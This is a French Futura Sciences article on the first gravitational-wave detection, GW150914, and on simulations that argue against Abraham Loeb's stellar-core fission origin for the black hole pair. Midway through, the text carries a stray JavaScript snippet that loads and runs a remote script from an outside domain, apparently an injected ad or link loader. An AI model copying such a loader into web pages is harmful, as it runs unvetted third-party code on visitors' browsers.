{"title": "Ondes gravitationnelles : un trou noir binaire ne dans une etoile ?", "newspaper": "Futura Sciences", "author": ["Laurent Sacco"], "date_publi": "2017-12-22", "content": "La premiere detection des ondes gravitationnelles emises par la fusion de deux trous noirs a surpris les astrophysiciens. Pouvait-il s'agir de deux trous noirs nes dans une etoile en rotation rapide et en effondrement gravitationnel ? Une reponse a ete donnee en calculant precisement le signal produit par ce scenario. La detection des  ondes gravitationnelles  produites par la collision de deux etoiles a neutrons est certainement l'evenement scientifique marquant de cette annee 2017. D'ailleurs, depuis le debut du XXI e  siecle, il n'y a probablement que la confirmation de l'existence du boson de  Brout-Englert-Higgs  dont l'importance soit comparable dans le domaine des sciences physiques. Cette detection, ainsi que celle des ondes emises par la  fusion  de deux trous noirs constituant un  systeme binaire , est a l'origine du prix Nobel de  physique  2017 et l'on peut penser qu'elle vaudra aussi un prix Nobel en 2018 a  Alain Brillet et Thibault Damour , qui ont, eux, recu la medaille d'or du CNRS pour leur contribution dans cette grande aventure (experimentale pour le premier puisqu'il est l'un des architectes du detecteur europeen d'ondes gravitationnelles Virgo, et theorique pour le second car il a joue un role cle dans la derivation de la forme du signal recherche pour la fusion de deux trous noirs a partir des equations de la  theorie de la relativite generale d'Einstein , dont on a fete la decouverte il y a deux ans). Nous ne sommes encore qu'au debut de l'astronomie des ondes gravitationnelles et, pour progresser, les chercheurs doivent encore raffiner les modeles des sources de ces ondes pour exploiter les signaux que des detecteurs comme  Ligo , Virgo,  Kagra  et, a l'horizon 2030, eLisa vont recevoir. Le temoignage d'Alain Brillet, medaille d'or du CNRS 2017. (c) CNRS Une collision de trous noirs acceleree par la friction de Chandrasekhar Les chercheurs ont ete surpris par les  masses  du premier  trou noir  binaire detecte par Ligo, GW150914. Comme Futura l'expliquait dans un precedent article (voir ci-dessous), les theoriciens ont essaye d'expliquer d'ou pouvait bien venir un tel monstre constitue de trous noirs dont chacune des masses etait d'environ 30 fois celle du Soleil. L'astrophysicien Abraham Loeb a ainsi propose que cela soit le resultat de l' effondrement  gravitationnel d'une etoile tres massive et en rotation tres rapide. Le coeur de cet astre se serait alors divise en deux du fait d'une instabilite mecanique bien connue avant que ces deux coeurs ne s'effondrent a leur tour, donnant deux trous noirs en orbite rapprochee et instable.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"https://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Mais il faut tester cette theorie. C'est ce qu'une equipe internationale de physiciens des universites de Kyoto, Cambridge et du Caltech cherche a faire en calculant le signal bien specifique des ondes gravitationnelles emises par ce phenomene a l'aide de surperodinateurs. Les resultats de ces simulations, qui pouvaient necessiter plusieurs heures de calculs, ont ete exposes dans un article disponible en ligne sur  arXiv . Selon l'un des membres de cette equipe, le physicien Joseph Fedrow, de l'Institut Yukawa de physique theorique de l'universite de Kyoto, la comparaison des signaux calcules avec ceux observes par Ligo avec la fusion des trous noirs n'est pas favorable au modele de Loeb. En effet, si les trous noirs naissaient bien dans un environnement dense, la fameuse force de friction dynamique de Chandrasekhar (a ne pas confondre avec une force de frottement classique) resultant des interactions gravitationnelles entre les trous noirs et le  gaz  de l'etoile dans lequel ils sont plonges accelererait le processus de collision qui prendrait moins de temps que dans l'espace-vide. Les deux situations conduisent donc en fait a des signaux nets et differents. Au final, ceci exclut le scenario de fragmentation pour la formation de GW150914. Pour en savoir plus Ondes gravitationnelles : un trou noir binaire dans une etoile ? Article de Laurent Sacco publie le 06/03/2016 Les caracteristiques du trou noir binaire qui a fusionne en donnant les ondes gravitationnelles detectees par Ligo ont surpris. Pour les expliquer, l'astrophysicien Abraham Loeb a fait intervenir la  fission  du coeur d'une  etoile geante  en deux parties qui se sont effondrees en trous noirs. Cela permet d'imaginer que les evenements detectes par Ligo ont parfois une contrepartie electromagnetique, par exemple, sous forme de  sursaut  gamma. GW150914, tel est le nom de la premiere source d'ondes gravitationnelles detectee directement sur  Terre  grace au  Laser  Interferometer Gravitational-wave Observatory (Ligo). Tout  porte  a croire qu'il s'agissait de la collision accompagnee d'une fusion de deux  trous noirs stellaires  formant un systeme binaire. C'est la premiere fois que l'on a une preuve de l'existence d'un tel systeme mais les chiffres concernant les estimations les plus probables des masses des deux trous noirs, respectivement 29 et 36 masses solaires, laissent les astrophysiciens perplexes. Les rares trous noirs stellaires detectes ne depassaient pas les 15 masses solaires et l'on ne comprend donc pas tres bien comment ces  astres  compacts ont pu se former Deux theories circulaient jusqu'a present. L'une etait plutot classique et faisait intervenir un systeme double de geantes bleues destinees a exploser chacune en  supernova  SN II puis a laisser comme cadavre des  trous noirs . Peut-etre que la particularite de ce systeme, une fois bien comprise, permettra d'expliquer pourquoi l'explosion accompagnant l'effondrement gravitationnel peut tout de meme laisser des objets compacts de plusieurs dizaines de masses solaires. L'autre faisait intervenir des trous noirs stellaires solitaires dans un environnement dense en etoile et riche en gaz qui auraient pu croitre par  accretion  avant de se capturer l'un l'autre pour former un systeme binaire. Le celebre astrophysicien de l'universite d'Harvard, Abraham Loeb, vient quant a lui de proposer une autre hypothese qui aurait certainement retenu l'attention de son defunt et incroyablement talentueux collegue, le prix Nobel de physique,  Subrahmanyan Chandrasekhar . Figure de l'astrophysique theorique du XX e  siecle, Subrahmanyan Chandrasekhar a laisse sa marque aussi bien dans la physique des etoiles que des galaxies et des trous noirs. (c)  University of Chicago                               Une hypothese inspiree par la figure d'equilibre des astres en rotation Rappelons que  Chandra , comme il aimait qu'on l'appelle, a fait des travaux importants sur la structure des etoiles et la theorie des trous noirs, y compris lorsqu'ils sont binaires. Dans la lignee des Clairaut, Maclaurin,  Darwin  et  Poincare , l'astrophysicien s'etait egalement interesse aux  figures d'equilibres  des masses fluides autogravitantes et en rotation. Ces figures permettent de comprendre la forme de la Terre et ont donne lieu a des speculations quant a l' origine de la Lune.  En effet, il y a plus d'un siecle, George Darwin, un astronome et mathematicien anglais, fils du celebre biologiste britannique  Charles Darwin , avait calcule ce qui pouvait se passer dans le cas d'une rotation rapide de la jeune Terre a l'etat fluide et chaud. Il avait montre que cela pouvait conduire a l'ejection d'un lambeau de  matiere  un peu a la facon de la formation de  gouttes  de  liquide  issues de la separation d'une goutte unique deformee en forme d'haltere et en rotation. Comme il l'explique dans un article depose sur  arXiv , Loeb reprend certains elements de cette hypothese. Il considere une jeune etoile massive en rotation rapide, tellement rapide que son coeur se separe en deux parties alors qu'il s'effondre et qui vont ensuite continuer de se contracter en trous noirs. Sur des  orbites  rapprochees, ceux-ci vont rapidement entrer en collision comme le veut le scenario a l'origine de GW150914. Une telle etoile particulierement massive, car depassant les 100 masses solaires, peut se former en raison de la fusion de deux jeunes etoiles composant une binaire a contact. Un phenomene dont nous avons des preuves de son occurrence dans le monde reel. L'astronomie gravitationnelle et l'energie noire En bonus, Abraham Loeb n'explique pas seulement l'existence de GW150914, il suggere que le petit  sursaut gamma  que le  telescope  Fermi a observe 0,4 seconde apres sa detection par Ligo dans la region ou se trouvait peut-etre l'astre a l'origine de GW150914 est bel et bien en relation avec la collision des deux trous noirs (son cousin europeen,  Integral , n'a lui rien detecte). En effet, ceux-ci etant entoures de matiere au cours de l'evenement, des processus electromagnetiques similaires a ceux postules avec les  hypernovae  avec formation de trous noirs a l'origine de certains sursauts gamma ont du survenir. La possibilite d'observer et d'etudier des contreparties electromagnetiques aux sources d'ondes gravitationnelles n'est pas seulement excitante pour les astrophysiciens relativistes cherchant a mieux comprendre les objets compacts et leurs interactions avec leur environnement. Elle ouvre aussi des perspectives pour les cosmologistes en permettant d'associer des decalages spectraux et des distances precises pour ces sources ce qui, en retour, devrait permettre d'affiner la mesure de certains parametres cosmologiques fondamentaux concernant par exemple la nature de l' energie noire . Ce qu'il faut retenir Les ondes gravitationnelles detectees pour la premiere fois par Ligo ont ete emises par la source baptisee GW150914, une fusion de deux trous noirs anormalement massifs. Pour expliquer l'existence de ces trous noirs, on a propose que ces derniers se soient formes par la fission du coeur d'une etoile massive en rotation rapide s'effondrant et qu'ils soient entres en collision tres rapidement dans le meme temps. Mais les calculs du signal genere par ce phenomene sur surperordinateur ne collent pas avec celui detecte. Cela vous interessera aussi Ondes gravitationnelles : leur detection expliquee en une minute                       Ca y est, des ondes gravitationnelles ont ete detectees. Ces fluctuations de l'espace-temps proviennent de la fusion de deux trous noirs d'environ 30 fois la masse de notre Soleil. Decouvrez dans cette video comment les scientifiques de Ligo ont pu effectuer ces premieres mesures.                                       ", "theme": "sciences"}